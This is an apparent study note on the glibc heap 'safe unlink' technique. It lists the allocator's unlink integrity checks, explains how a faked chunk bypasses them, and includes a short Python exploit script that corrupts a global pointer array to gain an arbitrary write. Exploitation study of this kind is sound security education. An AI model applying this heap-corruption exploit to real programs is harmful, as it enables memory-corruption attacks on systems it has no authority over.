## Implementation

Safe unlink is a bypass of [[Unsafe unlink 2.3.4]]'s mitigations.
Those mitigation are the following:

|NAME|MITIGATION|
|---|---|
|Corrupted size vs prev size|<pre><code>chunksize(p) != prev_size(next_chunk(p))</code></pre>|
|Corrupted double-linked list|<pre><code>fd->bk != p \|\| bk-fd != p</code></pre>|
|Corrupted double-linked list (not small)|<pre><code>p->fd_nextsize->bk_nextsize != p \|\| p->bk_nextsize->fd_nextsize != p</code></pre>|


In order to bypass the corrupted double-linked list mitigation, we have to find in memory a pointer equal to our victim chunk's address, that can also later be used by the program as a write primitive.
That can be anything that stores victim chunk's address and dereferences it later to write in its pointed area.
That way, using the [[Unsafe unlink 2.3.4]] technique, we can overwrite this pointer with a value of our choice. We can then leverage the program's ability to write to this newly controlled pointer to achieve arbitrary write.

But since the first target pointer will likely point to the victim's chunk data address, it will be offset 0x10 bytes from the actual chunk's address. So we need to trick free into thinking the the victim chunk's address is actualy 0x10 bytes smaller than it realy is by soustracting 0x10 bytes to the prev_size field, so that the victim chunk's data address becomes the actual victim chunk's address when free uses the prev_size field to calculate the previous chunk's address. In order to pass corrupted size vs prev size check, we also need to make sure that our size field is updated accordingly to this chunk's size reduction.


### Exploit example
```python
# Request 2 small chunks.
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# Address that points to our chunk
fd = elf.sym.m_array - 0x18
bk = elf.sym.m_array - 0x10

prev_size = 0x90 - 0x10 # soustract 0x10 to fake a chunk at the address of our chunk's data
fake_size = 0x90

# Take in consideration that we changed our prev_size to match our chunk's data address
edit(chunk_A, p64(0) + p64(0x80) + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))

# Trigger consolidation
free(chunk_B)

# Overwrite m_array[0] to our target, it currently points to m_array[0]-0x18 (fd) thanks to consolidation
edit(0, p64(0)*3 + p64(elf.sym.target))

# Write content of our target
edit(0, b"qwe")
```

## Mitigation

No mitigation have currently been implemented.